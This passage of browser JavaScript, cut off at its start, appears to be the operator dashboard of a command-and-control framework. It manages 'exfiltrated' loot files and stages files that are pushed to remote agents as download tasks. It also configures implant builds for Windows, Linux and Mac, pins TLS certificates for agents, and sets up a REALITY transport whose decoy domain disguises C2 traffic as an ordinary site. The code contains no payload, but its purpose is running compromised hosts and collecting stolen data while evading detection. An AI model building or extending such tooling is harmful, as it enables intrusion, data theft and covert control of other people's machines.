            return res.blob().then((blob) => ({ blob, filename }));
        })
        .then(({ blob, filename }) => {
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement("a");
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            window.URL.revokeObjectURL(url);
            status.textContent = "Download sent to your browser.";
        })
        .catch((err) => {
            status.textContent = `Download failed: ${err.message}. You can retry using Download.`;
        });
}

function deleteLoot(lootId) {
    if (!confirm("Delete this exfiltrated file?")) return;
    const status = document.getElementById("loot-action-status");
    status.textContent = "Deleting file…";
    apiFetch(`/api/loot/${lootId}`, { method: "DELETE" })
        .then(async (res) => {
            const data = await res.json();
            if (!res.ok || data.status !== "ok") throw new Error(data.error || `Server returned ${res.status}`);
            status.textContent = "File deleted.";
            loadLoot();
        })
        .catch((err) => { status.textContent = `File deletion failed: ${err.message}`; });
}

// Files staged for agents.

function stageFile() {
    const input = document.getElementById("stage-file-input");
    const btn = document.getElementById("stage-btn");
    const status = document.getElementById("stage-action-status");

    if (!input.files || input.files.length === 0) {
        status.textContent = "Select a file first.";
        return;
    }

    status.textContent = "";

    const formData = new FormData();
    formData.append("file", input.files[0]);

    setActionButtonState(btn, "loading", "Uploading");

    apiFetch("/api/files/stage", {
        method: "POST",
        body: formData,
    })
        .then(async (res) => {
            const data = await res.json();
            if (!res.ok || data.error) throw new Error(data.error || `Server returned ${res.status}`);
            return data;
        })
        .then((data) => {
            input.value = "";
            status.textContent = `Staged ${data.filename || "file"}.`;
            loadStagedFiles();
            settleActionButton(btn, "success", "Staged", 900);
            showToast(`Staged ${data.filename || "file"}.`, "success");
        })
        .catch((err) => {
            status.textContent = "Upload failed: " + err.message;
            settleActionButton(btn, "error", "Upload failed", 1200);
            showToast(`Upload failed: ${err.message}`, "error", 4200);
        });
}

function sendFileToAgent(input) {
    if (!input.files || input.files.length === 0 || !selectedAgentId || fileUploadInProgress) return;
    const agentId = selectedAgentId;
    const viewVersion = terminalViewVersion;
    const isCurrentView = () => agentId === selectedAgentId && viewVersion === terminalViewVersion;
    const status = document.getElementById("send-file-status");

    const file = input.files[0];
    fileUploadInProgress = true;
    status.textContent = `Uploading ${file.name} for ${agentId}…`;
    const formData = new FormData();
    formData.append("file", file);

    const btn = document.getElementById("send-file-btn");
    setActionButtonState(btn, "loading", "Uploading");

    appendToTerminal(`
        <div class="cmd-line">
            <span class="cmd-prompt" style="color:var(--orange)">[system]</span>
            <span class="cmd-text"> Uploading ${escapeHtml(file.name)} to server...</span>
        </div>
    `);

    apiFetch("/api/files/stage", {
        method: "POST",
        body: formData,
    })
        .then(async (res) => {
            const data = await res.json();
            if (!res.ok || !data || data.error || !Number.isSafeInteger(data.file_id) || data.file_id < 1 ||
                typeof data.filename !== "string" || !data.filename.trim()) {
                throw new Error(data?.error || `Invalid staging response (${res.status || "unknown status"})`);
            }
            return data;
        })
        .then(async (data) => {
            loadStagedFiles();
            const result = await sendCommand({
                command: `download ${data.file_id} ${data.filename}`, agentId, viewVersion,
            });
            status.textContent = result.ok
                ? `${file.name}: download queued for ${agentId}. Check that agent's Task History.`
                : `${file.name} is staged, but task submission for ${agentId} failed: ${result.error}`;
        })
        .catch((err) => {
            status.textContent = `Upload failed for ${agentId}: ${err.message}`;
            if (isCurrentView()) appendToTerminal(`
                <div class="cmd-output cmd-error">Upload failed: ${escapeHtml(err.message)}</div>
            `);
        })
        .finally(() => {
            input.value = ""; // Reset file input
            fileUploadInProgress = false;
            setActionButtonState(btn, "idle", "");
            btn.disabled = !selectedAgentId;
        });
}

function loadStagedFiles() {
    const list = document.getElementById("staged-file-list");
    apiFetch("/api/files")
        .then((res) => {
            if (!res.ok) throw new Error(`Server returned ${res.status}`);
            return res.json();
        })
        .then((data) => {
            if (!data || !Array.isArray(data.files)) throw new Error("Invalid file-list response");
            if (data.files.length === 0) {
                list.innerHTML = `<div class="empty-state small"><p>No files staged</p></div>`;
                return;
            }
            list.innerHTML = data.files
                .map(
                    (f) => `
                <div class="staged-item">
                    <span class="staged-id">ID: ${f.id}</span>
                    <span class="staged-filename">${escapeHtml(f.filename)}</span>
                    <span class="staged-size">${formatFileSize(f.file_size)}</span>
                    <span class="staged-date">${formatTimestamp(f.created_at)}</span>
                    <div class="staged-actions">
                        <button class="btn-delete" onclick="deleteStagedFile(${f.id})">✕</button>
                    </div>
                </div>
            `
                )
                .join("");
        })
        .catch((err) => {
            list.innerHTML = `<p class="list-error" role="alert">Unable to load files: ${escapeHtml(err.message)}. Refresh this page to retry.</p>`;
        });
}

function deleteStagedFile(fileId) {
    if (!confirm("Delete this staged file?")) return;
    const status = document.getElementById("staged-delete-status");
    status.textContent = "Deleting staged file…";
    apiFetch(`/api/files/${fileId}`, { method: "DELETE" })
        .then(async (res) => {
            const data = await res.json();
            if (!res.ok || data.status !== "ok") throw new Error(data.error || `Server returned ${res.status}`);
            status.textContent = "Staged file deleted.";
            loadStagedFiles();
        })
        .catch((err) => { status.textContent = `Staged file deletion failed: ${err.message}`; });
}

// Custom select controls.
function closeCustomSelect(shell, returnFocus = false) {
    if (!shell) return;
    shell.classList.remove("open");
    const trigger = shell.querySelector(".custom-select-trigger");
    if (trigger) {
        trigger.setAttribute("aria-expanded", "false");
        if (returnFocus) trigger.focus();
    }
}

function closeAllCustomSelects(except = null) {
    document.querySelectorAll(".custom-select-shell.open").forEach((shell) => {
        if (shell !== except) closeCustomSelect(shell);
    });
}

function customSelectOptionButtons(shell) {
    return Array.from(shell.querySelectorAll(".custom-select-option:not(:disabled)"));
}

function focusCustomSelectOption(shell, direction = 1) {
    const options = customSelectOptionButtons(shell);
    if (!options.length) return;
    const selected = shell.querySelector(".custom-select-option.is-selected:not(:disabled)");
    const startIndex = selected ? options.indexOf(selected) : -1;
    const nextIndex = startIndex >= 0
        ? (startIndex + direction + options.length) % options.length
        : (direction > 0 ? 0 : options.length - 1);
    options[nextIndex].focus();
}

function syncCustomSelect(select) {
    if (!select || typeof select.closest !== "function") return;
    const shell = select.closest(".custom-select-shell");
    if (!shell) return;

    const trigger = shell.querySelector(".custom-select-trigger");
    const valueEl = shell.querySelector(".custom-select-value");
    const menu = shell.querySelector(".custom-select-menu");
    const selectedOption = select.options[select.selectedIndex];

    if (valueEl) valueEl.textContent = selectedOption ? selectedOption.textContent.trim() : "Select";
    if (trigger) trigger.disabled = !!select.disabled;
    if (!menu) return;

    menu.innerHTML = "";
    Array.from(select.options).forEach((option, index) => {
        const item = document.createElement("button");
        item.type = "button";
        item.className = "custom-select-option";
        item.textContent = option.textContent.trim();
        item.dataset.index = String(index);
        item.setAttribute("role", "option");
        item.setAttribute("aria-selected", option.selected ? "true" : "false");
        item.disabled = option.disabled;
        if (option.selected) item.classList.add("is-selected");

        item.addEventListener("click", () => {
            if (option.disabled) return;
            select.selectedIndex = index;
            syncCustomSelect(select);
            select.dispatchEvent(new Event("input", { bubbles: true }));
            select.dispatchEvent(new Event("change", { bubbles: true }));
            closeCustomSelect(shell, true);
        });

        item.addEventListener("keydown", (event) => {
            const options = customSelectOptionButtons(shell);
            const currentIndex = options.indexOf(item);
            if (event.key === "ArrowDown" || event.key === "ArrowUp") {
                event.preventDefault();
                const delta = event.key === "ArrowDown" ? 1 : -1;
                const next = options[(currentIndex + delta + options.length) % options.length];
                if (next) next.focus();
            } else if (event.key === "Home") {
                event.preventDefault();
                options[0]?.focus();
            } else if (event.key === "End") {
                event.preventDefault();
                options[options.length - 1]?.focus();
            } else if (event.key === "Escape") {
                event.preventDefault();
                closeCustomSelect(shell, true);
            }
        });

        menu.appendChild(item);
    });
}

function enhanceCustomSelect(select) {
    if (!select || select.dataset.customSelect === "true") return;
    select.dataset.customSelect = "true";

    const shell = document.createElement("div");
    shell.className = "custom-select-shell";

    const trigger = document.createElement("button");
    trigger.type = "button";
    trigger.className = "custom-select-trigger";
    trigger.setAttribute("role", "combobox");
    trigger.setAttribute("aria-haspopup", "listbox");
    trigger.setAttribute("aria-expanded", "false");

    const menuId = `${select.id || "select"}-custom-listbox`;
    trigger.setAttribute("aria-controls", menuId);
    const label = select.closest(".form-group")?.querySelector("label")?.textContent?.trim();
    if (label) trigger.setAttribute("aria-label", label);

    const value = document.createElement("span");
    value.className = "custom-select-value";
    const chevron = document.createElement("span");
    chevron.className = "custom-select-chevron";
    chevron.setAttribute("aria-hidden", "true");
    trigger.append(value, chevron);

    const menu = document.createElement("div");
    menu.className = "custom-select-menu";
    menu.id = menuId;
    menu.setAttribute("role", "listbox");

    select.parentNode.insertBefore(shell, select);
    shell.append(select, trigger, menu);
    select.classList.add("custom-select-native");
    select.tabIndex = -1;

    trigger.addEventListener("click", () => {
        if (trigger.disabled) return;
        const shouldOpen = !shell.classList.contains("open");
        closeAllCustomSelects(shell);
        shell.classList.toggle("open", shouldOpen);
        trigger.setAttribute("aria-expanded", shouldOpen ? "true" : "false");
        if (shouldOpen) {
            syncCustomSelect(select);
            scheduleFrame(() => focusCustomSelectOption(shell, 1));
        }
    });

    trigger.addEventListener("keydown", (event) => {
        if (trigger.disabled) return;
        if (["ArrowDown", "ArrowUp", "Enter", " "].includes(event.key)) {
            event.preventDefault();
            if (!shell.classList.contains("open")) {
                closeAllCustomSelects(shell);
                shell.classList.add("open");
                trigger.setAttribute("aria-expanded", "true");
                syncCustomSelect(select);
            }
            scheduleFrame(() => focusCustomSelectOption(shell, event.key === "ArrowUp" ? -1 : 1));
        } else if (event.key === "Escape") {
            closeCustomSelect(shell);
        }
    });

    select.addEventListener("change", () => syncCustomSelect(select));
    select.addEventListener("input", () => syncCustomSelect(select));
    syncCustomSelect(select);
}

function enhanceCustomSelects() {
    document.querySelectorAll("select.form-select").forEach(enhanceCustomSelect);
}

function syncAllCustomSelects() {
    document.querySelectorAll("select.form-select").forEach(syncCustomSelect);
}

document.addEventListener("pointerdown", (event) => {
    const shell = event.target.closest?.(".custom-select-shell");
    closeAllCustomSelects(shell || null);
});

enhanceCustomSelects();

// Keep the default profile consistent with the selected OS.
const buildOsSelect = document.getElementById("build-os");
const buildProfileSelect = document.getElementById("build-profile");
const buildArchSelect = document.getElementById("build-arch");
const buildArch386Option = document.getElementById("build-arch-386");

function syncBuildTargetFields() {
    const os = buildOsSelect.value;
    const defaults = { windows: "1", linux: "2", mac: "5" };
    buildProfileSelect.value = defaults[os] || "1";
    buildArch386Option.disabled = os === "mac";
    if (buildArch386Option.disabled && buildArchSelect.value === "386") {
        buildArchSelect.value = "amd64";
    }
    syncCustomSelect(buildProfileSelect);
    syncCustomSelect(buildArchSelect);
}

if (buildOsSelect && buildProfileSelect && buildArchSelect && buildArch386Option) {
    buildOsSelect.addEventListener("change", syncBuildTargetFields);
    syncBuildTargetFields();
}

// Event listeners.
commandInput.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
        e.preventDefault();
        sendCommand();
    }
});

refreshBtn.addEventListener("click", () => {
    refreshBtn.classList.remove("refresh-spin");
    void refreshBtn.offsetWidth;
    refreshBtn.classList.add("refresh-spin");
    setTimeout(() => refreshBtn.classList.remove("refresh-spin"), 420);
    refreshAgents();
});

// Automatic refresh.
setInterval(() => {
    refreshAgents();
    loadStats();
    if (lootOpen) loadLoot();
}, REFRESH_INTERVAL);

// Initial load
refreshAgents();
loadStats();
scheduleFrame(() => positionNavIndicator());

// Sync transport-field visibility with the selector's current value.
// Browsers may restore a previously selected option (e.g. REALITY) after
// navigation, while the HTML defaults hide the REALITY fields. This call
// reconciles visibility without discarding any entered values.
toggleTransportFields();

// Re-synchronize on pageshow, load, and DOMContentLoaded to handle browser form restoration
// (e.g. when navigating back/forward via browser history where form state is restored after script execution).
if (typeof window !== "undefined" && window.addEventListener) {
    window.addEventListener("pageshow", () => {
        toggleTransportFields();
        syncAllCustomSelects();
        positionNavIndicator();
        setTimeout(() => {
            toggleTransportFields();
            syncAllCustomSelects();
        }, 0);
    });
    window.addEventListener("load", () => {
        toggleTransportFields();
        syncAllCustomSelects();
        positionNavIndicator();
        setTimeout(() => {
            toggleTransportFields();
            syncAllCustomSelects();
        }, 0);
    });
}
if (typeof document !== "undefined" && document.addEventListener) {
    document.addEventListener("DOMContentLoaded", () => {
        toggleTransportFields();
        syncAllCustomSelects();
        positionNavIndicator();
        setTimeout(() => {
            toggleTransportFields();
            syncAllCustomSelects();
        }, 0);
    });
}
const transportSelector = document.getElementById("build-transport");
if (transportSelector && transportSelector.addEventListener) {
    transportSelector.addEventListener("change", toggleTransportFields);
    transportSelector.addEventListener("input", toggleTransportFields);
}

// TLS certificate management.

function loadTlsStatus() {
    const body = document.getElementById("tls-status-body");
    if (!body) return;
    body.innerHTML = '<div class="tls-loading">Loading…</div>';

    apiFetch("/api/tls/status")
        .then((r) => r.json())
        .then((data) => {
            if (!data.enabled) {
                body.innerHTML = `
                    <div class="tls-status-badge disabled">HTTP ONLY</div>
                    <p class="form-hint">No certificate found. Generate one to enable HTTPS.</p>
                    <p class="form-hint" style="margin-top:6px">Agents built with an <code>http://</code> URL will use plain HTTP.</p>`;
                document.getElementById("tls-gen-warning").classList.add("hidden");
                return;
            }

            const c = data.cert;
            const expiry = new Date(c.not_valid_after);
            const now = new Date();
            const daysLeft = Math.ceil((expiry - now) / 86400000);
            const expiryClass = daysLeft < 30 ? "expiry-warn" : "expiry-ok";

            const sanHtml = c.san.length
                ? c.san.map((s) => `<span class="tls-san-tag">${escapeHtml(s.type.toUpperCase())}: ${escapeHtml(s.value)}</span>`).join("")
                : '<span class="tls-san-tag">none</span>';

            body.innerHTML = `
                <div class="tls-status-badge enabled">HTTPS ACTIVE</div>
                <div class="tls-cert-grid">
                    <div class="tls-cert-row">
                        <span class="tls-cert-label">CN</span>
                        <span class="tls-cert-value">${escapeHtml(c.cn)}</span>
                    </div>
                    <div class="tls-cert-row">
                        <span class="tls-cert-label">SAN</span>
                        <span class="tls-cert-value"><div class="tls-san-list">${sanHtml}</div></span>
                    </div>
                    <div class="tls-cert-row">
                        <span class="tls-cert-label">Expires</span>
                        <span class="tls-cert-value ${expiryClass}">${expiry.toLocaleDateString()}, ${daysLeft}d remaining</span>
                    </div>
                </div>
                <div class="tls-pin-block">
                    <span class="tls-cert-label">SPKI Pin (SHA-256)</span>
                    <code class="tls-pin-code" onclick="copyPin(${htmlStringArgument(c.spki_pin)})" title="Click to copy">${escapeHtml(c.spki_pin)}</code>
                    <span class="tls-restart-note">Click pin to copy. Restart the server after any cert change</span>
                </div>`;

            document.getElementById("tls-gen-warning").classList.remove("hidden");
        })
        .catch(() => {
            body.innerHTML = '<div class="tls-loading">Failed to load status.</div>';
        });
}

function copyPin(pin) {
    navigator.clipboard.writeText(pin).then(() => {
        const el = document.querySelector(".tls-pin-code");
        if (el) {
            const orig = el.textContent;
            el.textContent = "Copied!";
            setTimeout(() => { el.textContent = orig; }, 1500);
        }
    });
}

function generateCert(event) {
    event.preventDefault();

    const cn      = document.getElementById("tls-cn").value.trim();
    const sanIpsRaw = document.getElementById("tls-san-ips").value.trim();
    const sanDnsRaw = document.getElementById("tls-san-dns").value.trim();
    const days    = parseInt(document.getElementById("tls-days").value, 10);

    const san_ips = sanIpsRaw ? sanIpsRaw.split(",").map((s) => s.trim()).filter(Boolean) : [];
    const san_dns = sanDnsRaw ? sanDnsRaw.split(",").map((s) => s.trim()).filter(Boolean) : [];

    const btn    = document.getElementById("tls-gen-btn");
    const result = document.getElementById("tls-gen-result");

    setActionButtonState(btn, "loading", "Generating");
    result.classList.add("hidden");
    result.textContent = "";

    apiFetch("/api/tls/generate", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cn, san_ips, san_dns, days }),
    })
        .then((r) => r.json())
        .then((data) => {
            if (data.error) {
                result.className = "tls-gen-result error";
                result.textContent = "Error: " + data.error;
                result.classList.remove("hidden");
                settleActionButton(btn, "error", "Generation failed", 1300);
                showToast(`Certificate generation failed: ${data.error}`, "error", 4200);
                return;
            }

            result.className = "tls-gen-result success";
            result.innerHTML = `Certificate generated successfully.<br>
                <strong>SPKI Pin:</strong> <code>${escapeHtml(data.spki_pin)}</code><br>
                <strong>Expires:</strong> ${new Date(data.not_valid_after).toLocaleDateString()}<br>
                <span class="tls-restart-note">Restart the server to apply. Rebuild all agents with the new pin.</span>`;
            result.classList.remove("hidden");
            settleActionButton(btn, "success", "Certificate generated", 1000);
            showToast("Certificate generated. Restart the server to apply it.", "success");

            loadTlsStatus();
        })
        .catch((err) => {
            result.className = "tls-gen-result error";
            result.textContent = "Network error: " + err.message;
            result.classList.remove("hidden");
            settleActionButton(btn, "error", "Generation failed", 1300);
            showToast(`Certificate generation failed: ${err.message}`, "error", 4200);
        });
}

function deleteCert() {
    if (!confirm("Delete the certificate and key? The server will switch to HTTP after restart. Existing certificate-pinned agents will no longer connect.")) return;

    const btn = document.getElementById("tls-delete-btn");
    const status = document.getElementById("tls-action-status");
    status.textContent = "";
    setActionButtonState(btn, "loading", "Deleting");

    apiFetch("/api/tls/delete", { method: "DELETE" })
        .then(async (res) => {
            const data = await res.json();
            if (!res.ok || data.error) throw new Error(data.error || `Server returned ${res.status}`);
            return data;
        })
        .then((data) => {
            settleActionButton(btn, "success", "Deleted", 900);
            status.textContent = "Certificate deleted. Restart the server to apply the change.";
            showToast("Certificate deleted. Restart the server to return to HTTP.", "success");
            loadTlsStatus();
        })
        .catch((err) => {
            settleActionButton(btn, "error", "Delete failed", 1200);
            status.textContent = "Certificate deletion failed: " + err.message;
            showToast(`Certificate deletion failed: ${err.message}`, "error", 4200);
        });
}

// REALITY transport controls.

/**
 * Toggle visibility of REALITY-specific fields vs the Server Callback URL
 * field based on the transport mode selector.
 */
function toggleTransportFields() {
    const transportEl = document.getElementById("build-transport");
    if (!transportEl) return;
    const mode = transportEl.value;
    const serverUrlGroup = document.getElementById("server-url-group");
    const realityFields = document.getElementById("reality-fields");

    if (mode === "reality") {
        if (serverUrlGroup) serverUrlGroup.style.display = "none";
        if (realityFields) realityFields.style.display = "block";
    } else {
        if (serverUrlGroup) serverUrlGroup.style.display = "block";
        if (realityFields) realityFields.style.display = "none";
    }
}

let certificateMeasurementVersion = 0;
let certificateMeasurementController = null;
const certificateMeasurementHint = "Estimate only: checks the presented certificate chain against REALITY's 8,192-byte limit; confirm with a live REALITY connection.";

function resetCertificateMeasurement() {
    certificateMeasurementVersion++;
    if (certificateMeasurementController) certificateMeasurementController.abort();
    certificateMeasurementController = null;
    const hint = document.getElementById("decoy-domain-hint");
    if (hint) {
        hint.textContent = certificateMeasurementHint;
        hint.className = "form-hint";
    }
    const button = document.getElementById("check-domain-btn");
    if (button) {
        button.disabled = false;
        button.textContent = "Measure";
    }
}

function checkDecoyDomain() {
    resetCertificateMeasurement();
    const domainInput = document.getElementById("build-decoy-domain");
    const hintEl = document.getElementById("decoy-domain-hint");
    const checkBtn = document.getElementById("check-domain-btn");
    const domain = domainInput.value.trim();

    if (!domain) {
        hintEl.textContent = "Enter a domain first.";
        hintEl.className = "form-hint domain-check-result error";
        return;
    }

    const version = certificateMeasurementVersion;
    certificateMeasurementController = new AbortController();
    checkBtn.disabled = true;
    checkBtn.textContent = "Measuring…";
    hintEl.textContent = `Measuring ${domain}'s certificate chain…`;
    hintEl.className = "form-hint";

    apiFetch("/api/reality/check-domain", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ domain }),
        signal: certificateMeasurementController.signal,
    })
        .then((res) => res.json())
        .then((data) => {
            if (version !== certificateMeasurementVersion) return;
            if (domainInput.value.trim() !== domain) {
                resetCertificateMeasurement();
                return;
            }

            if (data.ok && Number.isInteger(data.size_bytes) && data.size_bytes > 0 &&
                Number.isInteger(data.limit_bytes) && data.limit_bytes > 0 &&
                typeof data.fits === "boolean") {
                hintEl.textContent = `Certificate size: ${data.size_bytes.toLocaleString()} bytes: ${data.fits ? "Fits" : "Does not fit"}. Estimate only; confirm with a live REALITY connection.`;
                hintEl.className = `form-hint domain-check-result ${data.fits ? "success" : "error"}`;
            } else {
                hintEl.textContent = `Measurement unavailable: ${data.error || "Unexpected response"}`;
                hintEl.className = "form-hint domain-check-result error";
            }
        })
        .catch((err) => {
            if (version !== certificateMeasurementVersion || err.name === "AbortError") return;
            hintEl.textContent = `Measurement unavailable: ${err.message}`;
            hintEl.className = "form-hint domain-check-result error";
        })
        .finally(() => {
            if (version !== certificateMeasurementVersion) return;
            certificateMeasurementController = null;
            checkBtn.disabled = false;
            checkBtn.textContent = "Measure";
        });
}

const decoyDomainEl = document.getElementById("build-decoy-domain");
if (decoyDomainEl && decoyDomainEl.addEventListener) {
    decoyDomainEl.addEventListener("input", resetCertificateMeasurement);
}
